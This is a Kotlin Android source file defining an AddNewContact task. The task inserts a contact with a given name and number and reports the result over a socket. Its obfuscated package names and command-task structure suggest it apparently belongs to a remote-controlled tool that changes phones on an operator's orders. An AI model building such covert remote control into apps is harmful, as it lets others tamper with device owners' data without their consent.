package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.content.ContentUris
import android.content.ContentValues
import android.content.Context
import android.content.pm.PackageManager
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import com.xxx.zzz.socketsp.IOSocketyt

class AddNewContact(
    private val ctx: Context,
    private val phone: String,
    private val contactName: String
) : BaseTask(ctx) {

    private fun addContact(name: String, phone: String) {
        runCatching {
            val contentValues = ContentValues()
            val rowContactUri =
                ctx.contentResolver.insert(ContactsContract.RawContacts.CONTENT_URI, contentValues)
            val rowContactId = ContentUris.parseId(rowContactUri!!)

            contentValues.clear()
            contentValues.put(ContactsContract.Data.RAW_CONTACT_ID, rowContactId)
            contentValues.put(
                ContactsContract.Data.MIMETYPE,
                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE
            )
            contentValues.put(ContactsContract.CommonDataKinds.Phone.NUMBER, phone)
            contentValues.put(
                ContactsContract.CommonDataKinds.Phone.TYPE,
                ContactsContract.CommonDataKinds.Phone.TYPE_HOME
            )
            ctx.contentResolver.insert(ContactsContract.Data.CONTENT_URI, contentValues)

            contentValues.clear()
            contentValues.put(ContactsContract.Data.RAW_CONTACT_ID, rowContactId)
            contentValues.put(
                ContactsContract.Data.MIMETYPE,
                ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE
            )
            contentValues.put(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME, name)
            ctx.contentResolver.insert(ContactsContract.Data.CONTENT_URI, contentValues)
            IOSocketyt.sendLogs("", "addContact $name $phone", "success")
        }.onFailure {
            IOSocketyt.sendLogs("", "addContact ${it.localizedMessage}", "error")
        }
    }

    override fun run() {
        super.run()
        if (ContextCompat.checkSelfPermission(
                ctx,
                Manifest.permission.WRITE_CONTACTS
            ) == PackageManager.PERMISSION_GRANTED
        )
            addContact(contactName, phone)
    }
}